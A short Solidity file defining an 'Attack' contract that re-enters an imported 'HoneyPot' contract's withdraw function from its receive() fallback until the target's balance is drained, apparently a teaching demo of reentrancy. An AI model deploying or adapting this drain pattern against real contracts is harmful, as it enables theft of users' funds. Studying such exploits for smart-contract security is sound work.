// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

import "./HoneyPot.sol";

contract Attack {
    HoneyPot public honeyPot;

    constructor(address _depositFundsAddress) {
        honeyPot = HoneyPot(_depositFundsAddress);
    }

    function attack() external payable {
        honeyPot.withdraw();
    }

    function deposit() external payable {
        require(msg.value >= 1 ether);
        honeyPot.deposit{value: 1 ether}();
    }

    receive() external payable {
        if (address(honeyPot).balance >= 1 ether) {
            honeyPot.withdraw();
        }
    }
}